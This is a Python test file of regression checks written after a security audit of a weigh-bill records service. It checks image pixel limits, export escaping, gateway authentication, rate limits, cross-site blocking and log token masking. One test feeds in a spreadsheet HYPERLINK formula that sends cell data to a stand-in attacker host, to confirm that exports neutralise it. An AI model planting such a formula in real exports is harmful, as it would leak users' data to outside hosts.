# -*- coding: utf-8 -*-
"""安全审计(2026-10-14)复现过的几条,修完后守住。"""
from __future__ import annotations

import io

from openpyxl import load_workbook
from PIL import Image

from weighbill import imaging
from tests.test_workflow import F, make, up


def _img(fmt, size):
    b = io.BytesIO(); Image.new("L", size, 255).save(b, fmt); return b.getvalue()


def test_pixel_bomb_is_rejected_before_decoding(tmp_path, monkeypatch):
    monkeypatch.setattr(imaging, "MAX_PIXELS", 1000)
    svc, c = make(tmp_path, [F("粤B1", "2026-10-10", "08:00", "08:10", "11000", "10000", "1000")])
    r = c.post("/api/v1/records", files={"photo": ("a.png", _img("PNG", (100, 100)), "image/png")}, data={"doc_type": "site_in"})
    assert r.status_code == 422 and "像素太大" in r.json()["error"]["message"]


def test_big_phone_jpeg_is_decoded_small_not_rejected(monkeypatch):
    """手机 48~108MP 的 JPEG 不能被像素上限误伤:按缩小比例解码后再判。"""
    monkeypatch.setattr(imaging, "MAX_PIXELS", 1000)
    im = imaging.normalize(_img("JPEG", (100, 100)), max_side=20)
    assert max(im.size) <= 25


def test_excel_and_csv_do_not_execute_user_text(tmp_path):
    t = F("=HYPERLINK(\"http://evil.example/?\"&C4,\"x\")", "2026-10-10", "08:00", "08:10", "11000", "10000", "1000")
    t["备注"] = "=1+2"
    svc, c = make(tmp_path, [t])
    rid = up(c, "site_in").json()["records"][0]["id"]
    wb = load_workbook(io.BytesIO(c.get("/api/v1/export.xlsx?kind=site_in").content))
    cells = [x for ws in wb.worksheets for row in ws.iter_rows() for x in row if isinstance(x.value, str) and x.value.startswith("=")]
    assert cells and all(x.data_type == "s" for x in cells), "以 = 开头的用户文字按文字存,不是公式"
    csv = c.get("/api/v1/records/export.csv").text
    assert "\"'=1+2\"" in csv and "\"=1+2\"" not in csv


def test_bad_characters_in_dates_or_customers_do_not_break_export(tmp_path):
    t = F("粤B1", "2026-10-10", "08:00", "08:10", "11000", "10000", "1000")
    svc, c = make(tmp_path, [t])
    up(c, "site_out", customer="广富源/湛江")
    assert c.get("/api/v1/export.xlsx?kind=site_out").status_code == 200


def test_anonymous_is_never_a_reviewer(tmp_path):
    svc, c = make(tmp_path, [], reviewers=[])
    assert c.get("/api/v1/me").json()["reviewer"] is False, "没有操作人 = 没走网关登录,不能审核"
    assert c.get("/api/v1/me", headers={"X-Portal-User": "rong"}).json()["reviewer"] is True


def test_gateway_secret_required_to_trust_the_user_header(tmp_path):
    svc, c = make(tmp_path, [], reviewers=[], gateway_secret="s3cret-xyz")
    assert c.get("/api/v1/me", headers={"X-Portal-User": "rong"}).json() == {"user": "匿名", "reviewer": False}, \
        "本机别的程序直接打 8000 端口、自己带个操作人头:不认"
    ok = c.get("/api/v1/me", headers={"X-Portal-User": "rong", "X-Gateway-Secret": "s3cret-xyz"}).json()
    assert ok == {"user": "rong", "reviewer": True}
    assert "s3cret" not in c.get("/api/v1/manifest", headers={"X-Portal-User": "rong", "X-Gateway-Secret": "s3cret-xyz"}).text


def test_upload_rate_limit_per_link(tmp_path):
    from tests.fixtures import photo
    t = F("粤B1", "2026-10-10", "08:00", "08:10", "11000", "10000", "1000")
    svc, c = make(tmp_path, [dict(t, 序号=f"GZD2610100000{i:04d}") for i in range(4)], upload_limit_per_hour=2,
                  capture_links={"tok": {"label": "现场"}, "tok2": {"label": "别处"}})
    send = lambda tok: c.post(f"/api/v1/capture/{tok}/records", files={"photo": ("a.jpg", photo(1), "image/jpeg")}).status_code
    assert [send("tok"), send("tok"), send("tok")] == [201, 201, 429], "一条链接一小时最多传这么多"
    assert send("tok2") == 201, "别的链接不受影响"


def test_cross_site_writes_are_refused(tmp_path):
    svc, c = make(tmp_path, [])
    H = {"X-Portal-User": "rong"}
    assert c.post("/api/v1/records/approve", json={"ids": []}, headers={**H, "Sec-Fetch-Site": "cross-site"}).status_code == 403
    assert c.post("/api/v1/records/approve", json={"ids": []}, headers={**H, "Origin": "https://evil.example"}).status_code == 403
    assert c.post("/api/v1/records/approve", json={"ids": []}, headers={**H, "Origin": "http://testserver"}).status_code == 200
    assert c.post("/api/v1/records/approve", json={"ids": []}, headers={**H, "Sec-Fetch-Site": "same-origin"}).status_code == 200


def test_capture_link_cannot_read_another_links_images(tmp_path):
    from tests.fixtures import photo
    t = F("粤B1", "2026-10-10", "08:00", "08:10", "11000", "10000", "1000")
    svc, c = make(tmp_path, [t], capture_links={"a": {"label": "同名"}, "b": {"label": "同名"}})
    r = c.post("/api/v1/capture/a/records", files={"photo": ("a.jpg", photo(1), "image/jpeg")}).json()["records"][0]
    key = r["crop_path"].split("/files/", 1)[1]
    assert c.get(f"/api/v1/capture/a/files/{key}").status_code == 200
    assert c.get(f"/api/v1/capture/b/files/{key}").status_code == 404, "链接名字一样也分得开:按链接摘要认"
    assert c.post(f"/api/v1/capture/b/records/{r['id']}/submit", json={}).status_code == 404


def test_tokens_are_masked_in_access_log():
    import logging
    from weighbill.http_api import _MaskTokens
    rec = logging.LogRecord("uvicorn.access", 20, "", 0, '%s - "%s %s HTTP/%s" %d', ("1.2.3.4", "GET", "/c/SECRET-TOKEN-123", "1.1", 200), None)
    _MaskTokens().filter(rec)
    assert "SECRET" not in rec.getMessage() and "/c/***" in rec.getMessage()


def test_local_user_only_applies_without_gateway(tmp_path):
    svc, c = make(tmp_path, [], local_user="本机演示")
    assert c.get("/api/v1/me").json() == {"user": "本机演示", "reviewer": True}
    svc2, c2 = make(tmp_path / "b", [], local_user="本机演示", gateway_secret="s")
    assert c2.get("/api/v1/me").json()["reviewer"] is False, "配了网关密钥就是生产,本机用户不起作用"
